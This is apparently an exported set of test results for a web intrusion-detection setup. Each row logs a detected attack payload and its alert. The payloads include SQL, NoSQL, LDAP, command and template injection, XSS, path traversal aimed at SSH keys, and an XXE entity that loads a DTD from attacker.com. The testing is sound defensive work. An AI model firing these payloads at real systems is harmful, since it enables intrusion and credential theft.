"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_005` |
| **Name** | MongoDB JavaScript code injection |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `'; return db.users.find(); //`
- **Encoded**: `%27%3B%20return%20db.users.find%28%29%3B%20//`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~16000ms
- **Timestamp**: 11:17:42.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1766315862502-gyjy0mk pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1

**Falco Log Entry**:
```
11:17:42.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_005-1766315862502-gyjy0mk pattern_id=EMRG_MONGO_005 uri=/?q=%27%3B%20return%20db.users.find%28%29%3B%20// client=127.0.0.1
```","1","test_e2e_with_logs[149_EMRG_MONGO_005]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_019` |
| **Name** | URL encoded newline injection |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%0als`
- **Encoded**: `%250als`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 11:17:44.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_019-1766315864516-3x8fn pattern_id=CMD_BASIC_019 uri=/?q=%250als client=127.0.0.1

**Falco Log Entry**:
```
11:17:44.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_019-1766315864516-3x8fn pattern_id=CMD_BASIC_019 uri=/?q=%250als client=127.0.0.1
```","1","test_e2e_with_logs[115_CMD_BASIC_019]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BLIND_004` |
| **Name** | LDAP email domain enumeration |
| **Category** | LDAP |
| **Subcategory** | blind_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `*)(mail=*@company.com)`
- **Encoded**: `*)(mail%3D*%40company.com)`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~9000ms
- **Timestamp**: 11:17:49.000 UTC

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_004-1766315869505-prc778 pattern_id=LDAP_BLIND_004 uri=/?q=*)(mail%3D*%40company.com) client=127.0.0.1

**Falco Log Entry**:
```
11:17:49.000000000: Critical [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_004-1766315869505-prc778 pattern_id=LDAP_BLIND_004 uri=/?q=*)(mail%3D*%40company.com) client=127.0.0.1
```","2","test_e2e_with_logs[134_LDAP_BLIND_004]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_009` |
| **Name** | SSH private key access |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../../home/user/.ssh/id_rsa`
- **Encoded**: `../../home/user/.ssh/id_rsa`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~21000ms
- **Timestamp**: 11:17:37.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_009-1766315857013-l0uz0k pattern_id=PATH_DOT_009 uri=/?q=../../home/user/.ssh/id_rsa client=127.0.0.1

**Falco Log Entry**:
```
11:17:37.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_009-1766315857013-l0uz0k pattern_id=PATH_DOT_009 uri=/?q=../../home/user/.ssh/id_rsa client=127.0.0.1
```","1","test_e2e_with_logs[089_PATH_DOT_009]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `OTHER_JINJA_001` |
| **Name** | Jinja2 basic template injection test |
| **Category** | OTHER |
| **Subcategory** | template_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{{7*7}}`
- **Encoded**: `%7B%7B7*7%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 11:17:44.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=OTHER_JINJA_001-1766315864006-ngva6 pattern_id=OTHER_JINJA_001 uri=/?q=%7B%7B7*7%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
11:17:44.000000000: Critical [NGINX Emerging Threat] Template injection test_id=OTHER_JINJA_001-1766315864006-ngva6 pattern_id=OTHER_JINJA_001 uri=/?q=%7B%7B7*7%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[123_OTHER_JINJA_001]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_011` |
| **Name** | Audio onerror XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<audio src=x onerror=alert('XSS')>`
- **Encoded**: `%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~28000ms
- **Timestamp**: 11:17:30.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_011-1766315850506-hfyd8h pattern_id=XSS_REFL_011 uri=/?q=%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:17:30.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_011-1766315850506-hfyd8h pattern_id=XSS_REFL_011 uri=/?q=%3Caudio%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[060_XSS_REFL_011]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_006` |
| **Name** | Apache site configuration access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `/etc/apache2/sites-available/000-default.conf`
- **Encoded**: `%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 11:17:44.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1766315864029-3x32e9 pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1

**Falco Log Entry**:
```
11:17:44.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1766315864029-3x32e9 pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1
```","1","test_e2e_with_logs[071_PATH_ABS_006]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_002` |
| **Name** | XXE external DTD parameter entity |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY % dtd SYSTEM ""http://attacker.com/evil.dtd"">`
- **Encoded**: `%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~8000ms
- **Timestamp**: 11:17:50.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1766315870998-125zmn pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1

**Falco Log Entry**:
```
11:17:50.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1766315870998-125zmn pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[138_XXE_ENTITY_002]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_013` |
| **Name** | onmouseover event handler injection |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<a onmouseover=alert(1)>hover</a>`
- **Encoded**: `%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~27000ms
- **Timestamp**: 11:17:31.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1766315851508-od72k pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:17:31.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1766315851508-od72k pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[062_XSS_REFL_013]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_SEMICOLON_001` |
| **Name** | Semicolon command separator with ls |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; ls -la`
- **Encoded**: `%3B%20ls%20-la`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~23000ms
- **Timestamp**: 11:17:35.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_SEMICOLON_001-1766315855496-fhxro pattern_id=CMD_BASIC_SEMICOLON_001 uri=/?q=%3B%20ls%20-la client=127.0.0.1

**Falco Log Entry**:
```
11:17:35.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_SEMICOLON_001-1766315855496-fhxro pattern_id=CMD_BASIC_SEMICOLON_001 uri=/?q=%3B%20ls%20-la client=127.0.0.1
```","1","test_e2e_with_logs[117_CMD_BASIC_SEMICOLON_001]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `GQL_INTRO_003` |
| **Name** | GraphQL mutation schema access |
| **Category** | GRAPHQL |
| **Subcategory** | introspection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `mutation{__schema{queryType{name}}}`
- **Encoded**: `mutation%7B__schema%7BqueryType%7Bname%7D%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~2000ms
- **Timestamp**: 11:17:56.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=GQL_INTRO_003-1766315876499-60iimj pattern_id=GQL_INTRO_003 uri=/?q=mutation%7B__schema%7BqueryType%7Bname%7D%7D%7D client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:17:56.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=GQL_INTRO_003-1766315876499-60iimj pattern_id=GQL_INTRO_003 uri=/?q=mutation%7B__schema%7BqueryType%7Bname%7D%7D%7D client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[144_GQL_INTRO_003]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_005` |
| **Name** | SSH config access via traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../../../etc/ssh/sshd_config`
- **Encoded**: `../../../../../etc/ssh/sshd_config`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~23000ms
- **Timestamp**: 11:17:35.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_005-1766315855009-5sv01ko pattern_id=PATH_DOT_005 uri=/?q=../../../../../etc/ssh/sshd_config client=127.0.0.1

**Falco Log Entry**:
```
11:17:35.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_005-1766315855009-5sv01ko pattern_id=PATH_DOT_005 uri=/?q=../../../../../etc/ssh/sshd_config client=127.0.0.1
```","1","test_e2e_with_logs[085_PATH_DOT_005]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_005` |
| **Name** | Subquery error-based injection |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT * FROM users WHERE id=1) --`
- **Encoded**: `'%20AND%20(SELECT%20*%20FROM%20users%20WHERE%20id%3D1)%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~21000ms
- **Timestamp**: 11:17:37.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_005-1766315857031-pig2qtp pattern_id=SQLI_ERROR_005 uri=/?q='%20AND%20(SELECT%20*%20FROM%20users%20WHERE%20id%3D1)%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
11:17:37.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_ERROR_005-1766315857031-pig2qtp pattern_id=SQLI_ERROR_005 uri=/?q='%20AND%20(SELECT%20*%20FROM%20users%20WHERE%20id%3D1)%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[015_SQLI_ERROR_005]","allure","2025-12-21","passed","2025-12-21","","test_e2e_wrapper","",""
